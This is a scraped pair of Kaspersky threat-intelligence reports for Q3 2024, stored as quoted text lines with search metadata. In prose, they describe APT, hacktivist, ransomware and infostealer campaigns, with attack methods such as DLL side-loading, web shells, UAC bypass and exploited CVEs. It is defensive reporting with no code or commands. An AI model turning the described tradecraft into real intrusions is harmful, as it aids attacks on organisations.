            "Text: Kaspersky’s Global Research and Analysis Team (GReAT) has been releasing quarterly summaries of advanced persistent threat (APT) activity for over seven years now. Based on our threat intelligence research, these summaries offer a representative overview of what we’ve published and discussed in more detail in our private APT reports. They are intended to highlight the significant events and findings that we think are important for people to know about. This is our latest roundup, covering activity we observed during Q3 2024.\n",
            "If you’d like to learn more about our intelligence reports or request more information about a specific report, please contact intelreports@kaspersky.com.\n",
            "In the second half of 2022, a wave of attacks from an unknown threat actor targeted victims with a new type of attack framework that we dubbed P8. The campaign targeted Vietnamese victims, mostly from the financial sector, with some from the real estate sector. Later, in 2023, Elastic Lab published a report about an OceanLotus APT (aka APT32) attack that leveraged a new set of malicious tools called Spectral Viper. Although the campaigns are the same, we cannot conclusively attribute P8 to OceanLotus.\n",
            "The P8 framework includes a loader and multiple plugins. Except for the first-stage loader and the PipeShell plugin, all plugins are downloaded from the C2 and then loaded into memory, leaving no trace on disk. After a thorough analysis of the framework and its modules, we believe P8 was developed based on the open source project C2Implant, which is a red teaming C2 framework. However, P8 contains many built-in functions and redesigns of the communication protocol and encryption algorithm, making it a well-designed and powerful espionage platform. Based on the implemented supported commands, we suspect the goal is to implement another Cobalt Strike-like post-exploitation platform. Methods to gain persistence on affected systems are not built in and depend on commands received from the C2.\n",
            "Unfortunately, we were unable to obtain any bait files or initial infection vectors. Based on limited telemetry, we believe with medium to low confidence that some of the initial infections were spear-phishing emails. Notably, these attacks use an obsolete version of the Kaspersky Removal Tool to side-load the P8 beacon. We also observed SMB and printer driver vulnerabilities being used to move laterally through the network.\n",
            "We published a follow-up report on P8 that describes the plugins used in the attacks. Each time the system restarts, or as required by the operation, P8 downloads additional plugins from the C2 or loads them from disk into memory. So far, we have collected 12 plugins or modules that are used to support the operation by adding functionality for lateral movement, exfiltration, file management, credential stealing, taking screenshots or custom loading capabilities. In particular, two plugins are used to upload files of interest; one plugin is used for small files, while a second is used to upload large files to another server, presumably to reduce the network load on the C2.\n",
            "We subsequently detected new attacks from this threat actor. While carrying out these attacks, the actor changed its TTPs from those outlined in our previous reports. For example, new persistence mechanisms were detected and we found that the loading mechanism of the final payload, the P8 beacon, also changed. In terms of victimology, there was little change. Most of the infections were still at financial institutions in Vietnam, with one victim active in the manufacturing industry. The infection vector has still not been found, nor have we been able to link these attacks to OceanLotus (APT32).\n",
            "Earlier in 2024, a secure USB drive was found to be compromised and malicious code was injected into the access management software installed on the USB drive. The secure USB drive was developed by a government entity in Southeast Asia to securely store and transfer files between machines in sensitive environments. The access management software facilitates access to the encrypted partition of the drive. A Trojanized version of the software module was found to be used in these attacks. The malicious code injected into it is designed to steal sensitive files saved on the secure partition of the drive, while also acting as a USB worm and spreading the infection to USB drives of the same type.\n",
            "Last year we investigated attacks against another different type of secure USB drive. Similarly, the attacks were delivered via a Trojanized USB management software called UTetris. We are tracking the threat actor behind the UTetris software attack as TetrisPhantom. In addition to the Trojanized UTetris software, TetrisPhantom uses a number of other malicious tools that have been in use for a few years. TetrisPhantom is still active and new samples of its tools have recently been detected.\n",
            "While both the tactic of targeting a secure USB drive by compromising the software module installed on the drive and the victim profile in the recent attacks are similar to TetrisPhantom attacks, the malicious code implanted in the drive bears little similarity to the code injected into the utetris.exe program.\n",
            "Our report provided an initial analysis of the Trojanized USB management program.\n",
            "Chinese-speaking activity\n",
            "In July 2021, we detected a campaign called ExCone targeting government entities in Russia. The attackers leveraged the VLC media player to deploy the FourteenHi backdoor after exploiting MS Exchange vulnerabilities. We also found Cobalt Strike beacons and several traces tying this actor to the ShadowPad malware and UNC2643 activity, which is in turn associated with the HAFNIUM threat actor.\n",
            "Later that year, we discovered a new set of activities. This time the victimology changed: victims were also found in Europe, Central Asia and Southeast Asia. We also found new samples that we linked to Microcin, a Trojan used exclusively by SixLittleMonkeys. Shortly after, another campaign called DexCone was discovered, with similar TTPs to the ExCone campaign. Several new backdoors such as Pangolin and Iguania were discovered, both of which have similarities to FourteenHi.\n",
            "Then, in 2022, we discovered another campaign by the same threat actor targeting Russia, with a special interest in government institutions, using spear-phishing emails as an infection vector and deploying an updated version of the Pangolin Trojan.\n",
            "After that, we did not observe any new activity related to this actor until mid-July 2024. In this most recent campaign, the actor uses spear-phishing emails, embedding a JavaScript loader as the initial infection vector. The JavaScript loader loads yet another loader from a ZIP file, which in turn downloads a BMP image containing shellcode and an embedded PE file, which is the final payload. This is a new backdoor with limited functionality, reading and writing to files and injecting code into the msiexec.exe process. In this campaign, the actor decided to attack Russian educational institutions instead of government entities as it had previously.\n",
            "The Scieron backdoor, a tool commonly used in cyber-espionage campaigns by the Scarab group, was detected in a new campaign. This campaign introduces novel decoders and loaders that use machine-specific information to decode and decrypt the Scieron backdoor and run it in memory. The campaign has specifically targeted a government entity in an African country and a telecoms provider in Central Asia. Notably, the infections within the telecoms provider have been traced back to 2022.\n",
            "More recently, in June 2024, an updated infection chain was identified, with an updated set of decoders and loaders designed to run the Scieron backdoor and make it persistent. Our private report also provides a detailed description of the attackers’ post-compromise activities.\n",
            "Europe\n",
            " Awaken Likho is an APT campaign, active since at least July 2021, primarily targeting government organizations and contractors. To date, we have detected more than 120 targets in Russia, but there are also targets in other countries and territories such as India, China, Vietnam, Taiwan, Turkey, Slovakia, the Philippines, Australia, Switzerland and the Czech Republic, among others. Based on our findings, we would like to highlight two specific features of this campaign: all attacks are well prepared, and the hackers rely on the use of the legitimate remote administration tool UltraVNC. While this approach is rather simplistic, the attackers have been using this technique successfully for years.\n",
            "We discovered a new Awaken Likho campaign that emerged in May 2024, in which the threat actor adjusted its TTPs slightly. The threat actor cleaned up its Golang SFX-based archives by removing unused files and also switched to executing AutoIT scripts after file extraction. UltraVNC remained the final payload, but in this campaign it was made to look like a OneDrive update utility. The targeting remained the same as in the earlier campaign – mainly government organizations and their contractors located in Russia.\n",
            "Awaken Likho then adjusted its TTPs again, in a campaign uncovered in June 2024 that is still ongoing. The threat actor continued to favor the use of AutoIT scripts and also began using protectors such as Themida to protect its samples. While most of the samples we found still deployed the UltraVNC module, the attackers changed the final payload from UltraVNC to MeshAgent in several samples. Unlike previous campaigns, we did not observe the Golang SFX droppers this time. The nature of the threat actor, leveraging open source and free tools, allows it to quickly change its arsenal during active campaigns.\n",
            "Epeius is a commercial spyware tool developed by an Italian company that claims to provide intelligence solutions to law enforcement agencies and governments. In recent years, the malware attracted the attention of the community due to the publication of two articles. The first, published in 2021 by Motherboard and Citizen Lab, shared the first evidence and indicators related to the software. The second, an article published in 2024 by the Google Threat Analysis Group, described the business model of various companies that provide commercial surveillance solutions. Knowledge of this threat is sparse and the Epeius malware has never been publicly described in detail. Our own threat hunting efforts to obtain related samples started in 2021, and last year we discovered a DEX file that we attribute with medium to high confidence to Epeius. Our private report describes what we know about Epeius and provides a technical description of its main Android component.\n",
            "Middle East\n",
            "In September 2023, our colleagues at ESET published a report on a newly discovered and sophisticated backdoor used by the FruityArmor threat actor, which they named DeadGlyph. The same month, we released an APT report detailing the ShadowWhisperer and NightmareLoader tools used in conjunction with the DeadGlyph malware. More recently, we identified what appears to be the latest version of the native DeadGlyph Executor backdoor module, with changes to both its architecture and workflow components.\n",
            " MuddyWater is an APT actor that surfaced in 2017 and has traditionally targeted countries in the Middle East, Europe and the USA. The actor typically uses multi-stage PowerShell execution in its attacks, probably to obfuscate the attacks, evade defenses and hinder analysis.\n",
            "Recently we uncovered VBS/DLL-based implants used in intrusions by the MuddyWater APT group that are still active today. The implants were found at multiple government and telecoms entities in Egypt, Kazakhstan, Kuwait, Morocco, Oman, Syria and the UAE. The threat actor achieves persistence through scheduled tasks that execute a malicious VBS file with the wscript.exe utility.\n",
            "The TTPs and infrastructure we analyzed for the current intrusions are similar to previously reported intrusions by the MuddyWater APT group.\n",
            "Southeast Asia and Korean Peninsula\n",
            "Gh0st RAT, an open source RAT created about 15 years ago, is used by various groups, including state-sponsored actors. One of them is Dragon Breath (aka APT-Q-27 and Golden Eye Dog), first discussed in 2020 in connection with a watering hole campaign aimed at tricking users into installing a Trojanized version of Telegram. By 2022, the group was still using Trojanized Telegram applications as an infection vector, but had changed the final payload to Gh0st RAT.\n",
            "A year later, Sophos published a blog post describing the latest change in the group’s TTPs, which included double side-loading DLLs. Since then, the Gh0st RAT payload has remained the same, but the attackers have again slightly adjusted their TTPs. DLL side-loading was abandoned and replaced by leveraging a logical flaw in a version of the TrueUpdate application, while more recently the group began to run the malware via a Python-based infection chain executed by the installer package.\n",
            "Historically, Dragon Breath has targeted the online gaming and gambling industry. Given the nature of the infection vector, we’re not yet able to determine the target audience for this campaign. The attack begins by tricking users into downloading a malicious MSI installer. Once the installer is started, the malware is installed alongside the legitimate application. We believe the victim is prompted to download and launch it from a fake site while searching for a Chinese version of the legitimate TrueUpdate MSI installer.\n",
            "Bitter APT has been active for over a decade. Since late 2023, this threat actor has used and continues to use CHM (compiled HTML) files, LNK shortcuts and DOC files as the first stage of infection. These files carry malicious scripts to connect to a remote server and download the next stage of the attacks, and appear to be used as attachments to spear-phishing emails. The payloads delivered via these malicious scripts represent new samples of backdoor modules described in previous private reports. However, in several cases, the final payloads can only be downloaded by pre-selected system configurations authorized by the threat actor after the initial reconnaissance phase. In a recent report, we discussed the workflow of the initial LNK, DOC and CHM files, their progress through the next stages of the attack, as well as the updates to the final backdoor modules and corresponding infrastructure.\n",
            " Tropic Trooper (aka KeyBoy and Pirate Panda) is an APT group operating since 2011. The group’s targets have traditionally been in government, as well as the healthcare, transportation and high-tech industries located in Taiwan, the Philippines, and Hong Kong. Our most recent investigation revealed that in 2024, the group conducted persistent campaigns against a government entity in Egypt, which began in June 2023.\n",
            "We noticed the infection in June 2024, when our telemetry showed recurring alerts for a new China Chopper web shell variant (China Chopper is used by many Chinese-speaking actors) found on a public web server. The server hosted a Content Management System (CMS) called Umbraco, an open source CMS platform for publishing content written in C#. The observed web shell component was compiled as a .NET module of Umbraco CMS.\n",
            "During our subsequent investigation, we looked for other suspicious detections on this public server and identified several related malware sets. These include post-exploitation tools that we believe with medium confidence are related and being used as part of this intrusion.\n",
            "We also identified new DLL search-order hijacking implants that are loaded from a legitimate vulnerable executable because it lacks the full path to the required DLL. This attack chain attempted to load the Crowdoor loader, named after SparrowDoor described by ESET. During the attack, the security agent blocked the first Crowdoor loader, which prompted the attackers to switch to a new, as yet unreported variant, with almost the same effect.\n",
            "We investigated the attribution of this activity to the Chinese-language threat actor known as Tropic Trooper. Our findings show an overlap in capabilities reported in recent Tropic Trooper campaigns. The samples we found also show a high degree of overlap with samples previously attributed to Tropic Trooper.\n",
            "PhantomNet is a RAT first described by ESET in late 2020. In 2021, we released our analysis of the PhantomNet malware, which at the time was being used in attacks against the Vietnamese government sector. Our report discussed in detail the plugins we found and the commands it supported.\n",
            "We rediscovered PhantomNet during a recent investigation into a cyberattack on the Brazilian education and government sectors that occurred in April. This time we were able to recover several scripts, commands executed by the attackers, and the PhantomNet builder tool. The threat actor has changed the persistence mechanism so that the payload is now stored in an encrypted manner in the Windows registry and with an associated loader to retrieve the payload from the registry. There are also some changes to the victimology. Previously, PhantomNet infections were found in Asia, but now the infections have been found in many regions around the world and affect a wide variety of industries.\n",
            "We discussed these findings in our private report, filling in the gaps from our previous report.\n",
            "We have observed that the Kimsuky group uses a strategy of registering malware as a service for reliable persistence. The so-called ServiceChanger malware drops a malicious DLL file and registers a service disguised as a legitimate service. In the case we analyzed, ServiceChanger installed the TOGREASE malware, which is an evolved version of GREASE that adds the ability to toggle RDP activation when necessary by the operator; and in another instance, it was observed installing the XMRig miner.\n",
            "In addition, this year’s updated version of the GREASE malware creates backdoor accounts to use RDP connections under the names “Guest” and “IIS_USER”, respectively. They borrow code from the publicly available UACME, allowing them to bypass UAC and execute commands with escalated privileges. Uniquely, the resources section within the GREASE malware includes a Zoom Opener installer vulnerable to DLL hijacking, which has not been observed in use by Kimsuky. However, it is possible that they may create malware that exploits this vulnerability in the future.\n",
            "The updated GREASE malware is thought to be connected to the RandomQuery malware also used by Kimsuky, as it communicates with the C2 in a similar manner. The similarity and the overlap between the TOGREASE and GREASE malware used by the Kimsuky group suggests that this group is behind the malware.\n",
            "Hacktivism\n",
            "In the course of our research on hacktivist groups targeting organizations based in Russia, we have identified similarities among several of these groups. This suggests either that these clusters of activity share at least a subset of the same individuals, or that the groups are working closely together in their attacks. Our report details the tools, malware, and procedures of the BlackJack group and links it to the previously known group Twelve. In addition, further examination of its preferred wiper and ransomware tools uncovered samples that cannot be definitively attributed to either group.\n",
            "Other interesting discoveries\n",
            "In June, we identified an active campaign called “PassiveNeuron”, targeting government entities in Latin America and East Asia using previously unknown malware. The servers were compromised before security products were installed, and the method of infection is still unknown. The implants used in this operation were dubbed “Neursite” and “NeuralExecutor”. They do not share any code similarities with known malware, so attribution to a known threat actor is not possible at this time. The campaign shows a high level of sophistication, with the threat actor using compromised internal servers as an intermediate C2 infrastructure. The threat actor is able to move laterally through the infrastructure and exfiltrate data, optionally creating virtual networks that allow attackers to steal files of interest even from machines isolated from the internet. A plugin-based approach provides dynamic adaptation to the attacker’s needs.\n",
            "In mid-April, we discovered a suspicious domain which, upon further investigation, revealed two backdoors written in Golang. During analysis, another backdoor was discovered that was used earlier in the attack timeline and protected using VMProtect. As well as the backdoors, an unknown keylogger and the use of the SOCAT tool were observed in this attack. The campaign exhibits a few peculiarities. First, the Golang backdoor uses Google Translate services as a proxy to communicate with the C2. Second, the threat actor tries to imitate Kaspersky software in terms of file names and names of scheduled tasks. Thirdly, we found only one infection, targeting a telecoms research center in India. We were unable to attribute this campaign to any known threat actor based on code similarity or TTPs.\n",
            "In early April, we decided to take a closer look at the Windows Desktop Window Manager (DWM) Core Library Elevation of Privilege vulnerability (CVE-2023-36033), which was previously discovered as a zero-day and exploited in the wild. While searching for samples related to this exploit and attacks using it, we found a document of note that was uploaded to a multi-scanner service on April 1, 2024. This document had a rather descriptive file name, indicating that it contained information about a vulnerability in the Windows operating system. Inside the document we found a brief description of a Windows Desktop Window Manager vulnerability and how it could be exploited to gain system privileges.\n",
            "The exploitation process described in the document was identical to that used in the previously mentioned zero-day exploit for CVE-2023-36033. However, the vulnerability was different. Judging by the quality of the writing and the fact that the document was missing critical details about how to actually trigger the vulnerability, there was a high probability that the vulnerability described was made up or was present in code that could not be accessed or controlled by the attackers. The subsequent investigation revealed a zero-day vulnerability that can be used to escalate privileges. After reporting the findings to Microsoft, the vulnerability was designated CVE-2024-30051 and a patch was released as part of Patch Tuesday on May 14, 2024.\n",
            "After closely monitoring our statistics for related exploits and attacks, it became clear that there were several exploits for this zero-day vulnerability. Our discoveries showed that it was being used in conjunction with QakBot and other malware such as NewBot, leading us to believe that multiple threat actors have access to it. While previous findings of in-the-wild exploitation of CVE-2024-30051 showed financial motivation, it is possible that it could be leveraged in future APT activity.\n",
            "An updated set of intrusions, possibly related to the Deathstalker cyber-mercenary group, employs an updated DarkMe VB6 OCX/DLL implant and stealthier TTPs, such as a more sophisticated infection chain.\n",
            "In the intrusions we reported previously, the threat actor typically delivered the initial dropper through instant messaging (IM) apps such as Skype. In more recent intrusions, the actor typically delivered the initial dropper through Telegram. We assess with medium confidence that the threat actor delivered the initial droppers via Telegram channels related to e-trading and fintech news.\n",
            "Apart from the delivery method, the attackers also increased their level of OPSEC and post-compromise cleanup by deleting post-exploitation files, tools, and registry keys after the operators achieve their objectives. Such actions, in turn, make the infection harder to detect and complicate post-compromise investigation.\n",
            "Final thoughts\n",
            "While some threat actors’ TTPs remain consistent over time, such as a heavy reliance on social engineering as a means of gaining entry into a target organization or compromising an individual’s device, others have updated their toolsets and expanded the scope of their activities. Our regular quarterly reviews are designed to highlight the most significant developments related to APT groups.\n",
            "Here are the key trends we observed in Q3 2024:\n",
            "This quarter, we saw threat actors broaden their targeting, both in terms of verticals and geography.\n",
            "The purpose of most APT activity is cyber-espionage, although hacktivist attacks remain a feature of the threat landscape this quarter, mirroring areas of real-world conflict.\n",
            "Even more open source tools have been employed by APT threat actors, mostly to manage network connectivity with C2s.\n",
            "We continue to see threat actors using LOTL (Living off the Land) techniques in their campaigns.\n",
            "As always, we would like to point out that our reports are the product of our visibility into the threat landscape. However, it is important to remember that while we strive for continuous improvement, there is always the possibility that other sophisticated attacks may fly under our radar.\n",
            " Disclaimer: When we refer to APT groups as Russian-speaking, Chinese-speaking, etc., we are referring to various artifacts used by the groups (such as malware debugging strings, comments found in scripts, etc.) that contain words in those languages, based on information we have obtained directly or that is otherwise publicly known and widely reported. The use of certain languages does not necessarily indicate a specific geographic relationship, but rather indicates the languages used by the developers behind these APT artifacts.\n",
            "Highlights: ['This is our latest roundup, covering activity we observed during Q3 2024. If you’d like to learn more about our intelligence reports or request more information about a specific report, please contact intelreports@kaspersky.com. In the second half of 2022, a wave of attacks from an unknown threat actor targeted victims with a new type of attack framework that we dubbed P8. The campaign targeted Vietnamese victims, mostly from the financial sector, with some from the real estate sector. Later, in 2023, Elastic Lab published a report about an OceanLotus APT (aka APT32) attack that leveraged a new set of malicious tools called Spectral Viper.']\n",
            "Highlight Scores: [0.5614339709281921]\n",
            "Summary: None\n",
            "\n",
            "\n",
            "Title: IT threat evolution Q3 2024\n",
            "URL: https://securelist.com/malware-report-q3-2024/114678/\n",
            "ID: https://securelist.com/malware-report-q3-2024/114678/\n",
            "Score: 0.14568594098091125\n",
            "Published Date: 2024-11-29T10:45:54.000Z\n",
            "Author: David Emm\n",
            "Image: https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/11/28180857/SL-malware-report-q3-2024-featured.jpg\n",
            "Extras None\n",
            "Subpages: None\n",
            "Text: IT threat evolution in Q3 2024 \n",
            "IT threat evolution in Q3 2024. Non-mobile statistics \n",
            "IT threat evolution in Q3 2024. Mobile statistics \n",
            "Targeted attacks\n",
            "New APT threat actor targets Russian government entities\n",
            "In May 2024, we discovered a new APT targeting Russian government organizations. CloudSorcerer is a sophisticated cyber-espionage tool used for stealth monitoring, data collection and exfiltration via Microsoft, Yandex and Dropbox cloud infrastructures. The malware utilizes cloud resources for its C2 (command and control) servers, which it accesses via APIs using authentication tokens. CloudSorcerer also employs GitHub as its initial C2 server. CloudSorcerer functions as separate modules – for communication and data collection – depending on the process it’s running, but executes from a single executable. It leverages Microsoft COM object interfaces to perform its malicious operations.\n",
            "While the modus operandi of the threat actor is reminiscent of the CloudWizard APT that we reported on in 2023, the malware code is completely different. Consequently, we believe CloudSorcerer is a new threat actor that has emulated a similar approach to interacting with public cloud services.\n",
            "Two months later, in July 2024, CloudSorcerer launched further attacks against Russian government organizations and IT companies. The campaign, which we dubbed EastWind, used phishing emails with malicious shortcuts attached to deliver malware to target computers. The malware, which received commands via the Dropbox cloud service, was used to download additional payloads.\n",
            "One of these was an implant called GrewApacha, used by APT31 since at least 2021. The other was an updated version of the backdoor used by CloudSorcerer in its earlier attacks. This one uses LiveJournal and Quora profiles as initial C2 servers.\n",
            "The latest attacks also use a previously unknown implant with classic backdoor functionality called PlugY. This malware, which is loaded via the CloudSorcerer backdoor, has an extensive command set and is capable of supporting three different protocols for communicating with the C2. The code is similar to that of the DRBControl (aka Clambling) backdoor, which has been attributed to APT27 by several companies.\n",
            "BlindEagle adds side-loading to its arsenal\n",
            "In August, we reported a new campaign by Blind Eagle, a threat actor that has been targeting government, finance, energy, oil and gas and other sectors in Latin America since at least 2018. The campaign aligns with the TTPs (Tactics, Techniques and Procedures) and artifacts used by BlindEagle, although the attackers have introduced one new technique to their toolset – DLL side-loading.\n",
            "The attack starts with phishing emails purporting to be a court order or summons from an institution in Colombia’s judicial system. The email contains a link in the body of the message that is also contained in the attached file, which appears to be a PDF or Word document. Victims are tricked into clicking the link to retrieve documents related to the lawsuit.\n",
            "   \n",
            "These documents are in fact password-protected ZIP or other archives. The archive files contain a clean executable file responsible for initiating the infection process through side-loading, alongside various malicious files used in the attack chain. One of these files carries an embedded loader named HijackLoader, which decrypts and loads the final payload. The final payload is a version of AsyncRAT, one of the Remote Access Trojans (RATs) used by BlindEagle in previous campaigns.\n",
            "You can read more details about this campaign and the TTPs employed by this threat actor in general here.\n",
            "Tropic Trooper spies on government entities in the Middle East\n",
            "The threat actor Tropic Trooper, active since 2011, has historically targeted government, healthcare, transportation and high-tech sectors in Taiwan, the Philippines and Hong Kong. In June 2023, Tropic Trooper initiated a series of persistent campaigns targeting a government body in the Middle East.\n",
            "We were alerted to the infection in June of this year when our telemetry indicated recurring alerts for a new China Chopper web shell variant discovered on a public web server. China Chopper is widely used by Chinese-speaking actors. The server was hosting a CMS (Content Management System) called Umbraco, an open source CMS platform for publishing content, written in C#. The observed web shell component was compiled as a .NET module of the Umbraco CMS.\n",
            "     Malicious module found inside Umbraco CMS on the compromised server \n",
            "In the course of our subsequent investigation, we looked for other suspicious detections on this public server and identified several malware sets. These include post-exploitation tools that we have assessed with medium confidence to be related to this intrusion. We also identified new DLL search-order hijacking implants that are loaded from a legitimate vulnerable executable as it lacks the full path specification to the DLL it needs. This attack chain attempted to load the Crowdoor loader, named partly after the SparrowDoor backdoor described by ESET. During the attack, the security agent blocked the first Crowdoor loader, prompting the attackers to switch to a new, previously unreported variant with almost the same impact.\n",
            "We attribute this activity with high confidence to the Chinese-speaking threat actor known as Tropic Trooper. Our findings show an overlap in the techniques reported in recent Tropic Trooper campaigns. The samples we found also demonstrate a high degree of overlap with samples previously attributed to Tropic Trooper.\n",
            "The significance of this intrusion is that it involved a Chinese-speaking actor targeting a CMS platform that published studies on human rights in the Middle East, with a particular focus on the situation surrounding the Israel-Hamas conflict. Our analysis revealed that the entire system was the sole target during the attack, suggesting a deliberate focus on this specific content.\n",
            "From 12 to 21: connections between Twelve and BlackJack groups\n",
            "In the spring of 2024, posts containing personal data of real individuals began appearing on the -=TWELVE=- Telegram channel. This was soon blocked for violating Telegram’s terms of service, and the group remained inactive for several months. However, during our investigation of an attack in late June, we discovered techniques identical to Twelve’s and the use of C2 servers associated with this threat actor.\n",
            "The Twelve group was established in April 2023 in the context of the Russian-Ukrainian conflict and has been attacking Russian government organizations ever since. The threat actor specializes in encrypting and then deleting its targets’ data, which suggests that the group’s primary objective is to cause as much damage as possible. Twelve also exfiltrates sensitive information from targeted systems and posts it on the group’s Telegram channel.\n",
            "Interestingly, Twelve shares infrastructure, utilities and TTPs (Tactics, Techniques and Procedures) with the DARKSTAR ransomware group (formerly known as Shadow or COMET). This indicates that the two may belong to the same syndicate or activity cluster. At the same time, while Twelve’s actions are clearly hacktivist in nature, DARKSTAR adheres to the classic double extortion pattern. This variation in objectives within the syndicate highlights the complexity and diversity of modern cyberthreats.\n",
            "In our September report on Twelve, we used the Unified Kill Chain methodology to analyze the group’s activities.\n",
            "We also discovered overlapping TTPs with BlackJack, another hacktivist group that emerged in late 2023. This group’s stated aims, from its Telegram channel, is to find vulnerabilities in the networks of Russian organizations and government institutions. The threat actor has claimed responsibility for more than a dozen attacks, and our telemetry also contains information about other undisclosed attacks where indicators point to BlackJack’s involvement.\n",
            "The group uses only freely available and open source software. This includes the use of the ngrok utility for tunneling, Radmin, AnyDesk and PuTTY for remote access, the Shamoon wiper and a leaked version of the LockBit ransomware. This confirms that this is a hacktivist group that lacks the resources typical of large APT threat actors.\n",
            "Other malware\n",
            "How “professional” ransomware groups boost the business of cybercriminals\n",
            "Cybercriminals who want to get into the ransomware business don’t necessarily need to develop the software themselves. They can find a leaked ransomware variant online, buy ransomware on the dark web, or become an affiliate. In recent months, we have published several private reports detailing exactly this.\n",
            "In April, IxMetro was hit by an attack that used a still-new ransomware variant dubbed “SEXi”, a group that focuses primarily on ESXi applications. In each of the cases we investigated, the targeted organizations were running unsupported versions of ESXi. This group deploys either LockBit or Babuk ransomware, depending on the platform – Windows or Linux, respectively.\n",
            "In the majority of cases, the attackers leave a note containing an email address or URL for a leak site. In the case we looked at, the note included a user ID associated with the Session messaging app. The ID belonged to the attackers and was used across a number of different ransomware attacks on a variety of victims. This indicates a lack of professionalism and suggests that the attackers did not have a TOR leak site.\n",
            "Key Group (aka keygroup777) has utilized no fewer than eight different ransomware families in its relatively short history (since April 2022):\n",
            "     Use of leaked ransomware builders by Key Group \n",
            "Over the approximately two-year period that the group has been active, it has made minor adjustments to its TTPs with each new ransomware variant. For example, the persistence mechanism was consistently implemented via the registry, though the specific technique differed by family. In most cases, autorun was used, but we’ve also seen them using the startup folder. While Russian-speaking groups typically operate outside Russia, this is not the case with Key Group. Like SEXi’s, Key Group’s operations are not particularly professional. For example, the primary C2 channel is a GitHub repository, which makes the group easier to track, and communication is conducted over Telegram, as opposed to a dedicated server on the TOR network.\n",
            "Mallox is a relatively new ransomware variant that first came to light in 2021 and kicked off an affiliate program in 2022. It’s unclear how the authors obtained the source code: perhaps they wrote it from scratch, used a published or leaked version, or – as they claim – purchased it. Although it started as a private group running its own campaigns, it launched an affiliate program shortly after its inception. It is noteworthy that the group only engages with Russian-speaking affiliates and does not do business with novices. Affiliates are explicitly instructed to target organizations with a minimum revenue of $10 million and to avoid hospitals and educational institutions. Mallox uses affiliate IDs, making it possible to track affiliate activity over time. In 2023, there were 16 active partners. In 2024, only eight of the original affiliates were still active, with no newcomers. Other than that, Mallox has all the typical Big Game Hunting attributes that other groups have, such as a leak site and a server hosted on TOR.\n",
            "You can read more about the above threats here. You can also read our full report on Mallox ransomware here. To learn more about our crimeware reporting service, contact us at crimewareintel@kaspersky.com.\n",
            "HZ Rat backdoor for macOS\n",
            "In June, we discovered a macOS version of the HZ Rat backdoor. The backdoor was being used to target users of the enterprise messenger DingTalk and the social networking and messaging platform WeChat. Although we do not know the original distribution point for the malware, we were able to locate an installation package for one of the backdoor samples – a file named OpenVPNConnect.pkg.\n",
            "     OpenVPNConnect.pkg on VirusTotal \n",
            "The samples we discovered almost exactly replicate the functionality of the Windows version of the backdoor with the exception of the payload, which is received in the form of shell scripts from the attackers’ server. We noticed that some versions of the backdoor utilize local IP addresses to connect to the C2, leading us to believe the threat might be targeted. This also suggests that the attackers intend to use the backdoor for lateral movement through the target network.\n",
            "The data collected about the targets’ companies and contact information could be used to spy on people of interest and lay the groundwork for future attacks. During the course of our investigation, we did not encounter the use of two of the backdoor’s commands (write file to disk and send file to server), so the full scope of the attacker’s intentions remains unclear.\n",
            "Hacktivist group Head Mare targets Russia and Belarus\n",
            "Since the start of the Russo-Ukrainian conflict, numerous hacktivist groups have emerged whose main goal is to cause damage to organizations on the opposing side of the conflict. One such group is Head Mare, which targets organizations in Russia and Belarus.\n",
            "While such hacktivist groups tend to use similar TTPs, Head Mare uses more up-to-date methods to gain initial access. For example, the attackers leveraged a recently discovered vulnerability in WinRAR (CVE-2023-38831) that allowed them to execute arbitrary code on a compromised system via a specially crafted archive. This approach allows the group to more effectively deliver and disguise the malicious payload.\n",
            "As is the case with most hacktivist groups, Head Mare maintains a public account on the X social network, which it uses to post information about some of its victims.\n",
            "     Head Mare post on X \n",
            "Head Mare has targeted a variety of industries, including government, energy, transportation, manufacturing and entertainment. The group mainly uses publicly available software, which is typical of hacktivist groups. However, Head Mare’s toolkit also includes custom malware, PhantomDL and PhantomCore, delivered via phishing emails. In addition to its primary goal of causing damage to targeted organizations, Head Mare also deploys LockBit and Babuk ransomware, which demand a ransom for restoring encrypted data.\n",
            "Loki: a new private agent for the popular Mythic framework\n",
            "In July, we discovered a previously unknown backdoor called Loki, which was used in a series of targeted attacks against Russian companies in various industries, including engineering and healthcare. From our analysis and information gleaned from open sources, we determined that Loki is a private version of an agent for the open source Mythic framework. This has its origins in an open source framework for post-exploitation of compromised macOS systems, called Apfell. Two years later, several developers joined the project, the framework became cross-platform and was renamed Mythic. Mythic allows the use of agents in any language, for any platform, with the required functionality. Around two dozen agents have been published in the official Mythic repository, including Loki.\n",
            "The Loki agent we discovered is a Mythic-compatible version of the agent for another framework, Havoc. The Loki modification inherited several techniques from Havoc to make it more difficult to analyze the agent, such as encrypting its memory image, indirectly calling system API functions, searching for API functions by hash and more. However, unlike the agent for Havoc, Loki was split into a loader and a DLL, where the main functionality of the malware is implemented.\n",
            "Based on our telemetry, and the filenames of infected files, we believe that in several cases Loki was distributed via email, with unsuspecting victims launching the file themselves. More than a dozen companies have encountered this threat, although we believe the number of potential victims may be higher.\n",
            "There is currently not enough data to attribute Loki to any known group. Rather than using standard email templates to distribute the agent, we think it’s likely that the attackers are approaching each target individually. We have also not found any unique tools on the infected machines that could help with attribution. The attackers seem to prefer using only publicly available traffic tunneling utilities such as gTunnel and ngrok, and the goReflect tool to modify them.\n",
            "Tusk: unravelling a complex infostealer campaign\n",
            "The Kaspersky Global Emergency Response Team (GERT) recently identified a complex campaign consisting of several sub-campaigns orchestrated by Russian-speaking cybercriminals. The sub-campaigns imitate legitimate projects, with slight modifications to names and branding, and using multiple social media accounts to enhance their credibility.\n",
            "All the active sub-campaigns host the initial downloader on Dropbox. This downloader is responsible for delivering additional malware samples to the target’s machine, mostly infostealers (Danabot and StealC) and clippers (which monitor clipboard data). Additionally, the threat actors employ phishing tactics to entice individuals into revealing further sensitive information, such as credentials, which can then be sold on the dark web or used to gain unauthorized access to gaming accounts and cryptocurrency wallets, resulting in direct financial loss.\n",
            "We identified three active sub-campaigns and 16 inactive sub-campaigns related to this activity, which we dubbed “Tusk”. In the three active sub-campaigns we analyzed, the threat actor uses the word “Mammoth” (a slang word used by Russian-speaking threat actors to refer to victims) in log messages of initial downloaders. Analysis of the inactive sub-campaigns suggests that they are either old campaigns or campaigns that haven’t started yet.\n",
            "Our report includes our analysis of the three most recently active sub-campaigns – TidyMe, RuneOnlineWorld and Voico.\n",
            "   \n",
            "These campaigns underscore the persistent and evolving threat posed by cybercriminals who are adept at mimicking legitimate projects to deceive victims. By capitalizing on user trust in well-known platforms, these attackers effectively deploy a range of malware designed to steal sensitive information, compromise systems, and ultimately reap financial gain.\n",
